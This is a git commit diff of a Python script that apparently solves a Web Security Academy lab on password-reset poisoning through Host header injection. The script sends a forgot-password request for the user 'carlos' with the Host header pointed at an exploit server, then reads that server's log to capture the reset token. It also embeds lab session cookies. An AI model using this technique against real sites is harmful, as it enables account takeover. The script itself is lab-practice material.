a591f2fa1423905f6cf2b69999ef17dc997eed36
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2021-10-30 01:37:30 -0400

    this-code-is-so-dirty

--- host_header/header_basicPasswordReset.py
+++ host_header/header_basicPasswordReset.py
@@ -3,25 +3,27 @@
 import requests
 from bs4 import BeautifulSoup
 
-def get_csrf(url, endpoint_forgot_password):
+def get_csrf(url, endpoint_forgot_password, cookie):
 
     # Getting CSRF Token
-    s = requests.Session()
-    r = s.get(url + endpoint_forgot_password)
+    headers = {
+        "Cookie" : cookie,
+    }
+
+    r = requests.get(url + endpoint_forgot_password, headers=headers)
     p = BeautifulSoup(r.content, "lxml")
 
     csrf = p.find(attrs = {'name' : 'csrf'})['value']
-    print(csrf)
 
     return csrf
 
-def forgot_password(url, url_exploit, endpoint_forgot_password):
+def forgot_password(url, url_exploit, endpoint_forgot_password, cookie):
 
-    csrf = get_csrf(url, endpoint_forgot_password)
-    print(csrf)
+    csrf = get_csrf(url, endpoint_forgot_password, cookie)
 
     headers = {
         "Host" : url_exploit,
+        "Cookie" : cookie,
     }
 
     data = {
@@ -29,14 +31,23 @@ def forgot_password(url, url_exploit, endpoint_forgot_password):
         "username" : "carlos",    
     }
 
-    s = requests.Session()
-    r = s.post(url + endpoint_forgot_password, headers=headers, data=data)
+    r = requests.post(url + endpoint_forgot_password, headers=headers, data=data)
     print(r.status_code)
+
+def read_log(url_exploit, endpoint_log):
+
+    r = requests.get("https://" + url_exploit + endpoint_log)
+    print(r.text)
 
 
 if __name__ == '__main__':
     url = "https://acf01f131ec49525c06c810d0090008f.web-security-academy.net"
     url_exploit = "exploit-acfd1fbb1ebe951fc0088114011000ca.web-security-academy.net"
     endpoint_forgot_password = "/forgot-password"
+    endpoint_log = "/log"
+    cookie = "_lab=47%7cMC0CFQCQnqHHZ7XqFTmrt6HwPWoHilOZBwIUT1N3bWxrqctijGMhNHWaQ7al"
+    cookie+= "%2fXFcXesijwqM1bsb%2blyt1WwNlamzLE2saqrXNJrSESnmgUcYOgINY2IjSpp8x7PdOSgw5S7KZvof7GmEMK5GkaVThootrmiFVQwU85KKW2INWcJY4t%2f9; session=VuLVqjnuJt3WVrOjbczRwuIVvYdHMC7n"
 
-    forgot_password(url, url_exploit, endpoint_forgot_password)
+    forgot_password(url, url_exploit, endpoint_forgot_password, cookie)
+    read_log(url_exploit, endpoint_log)
+    
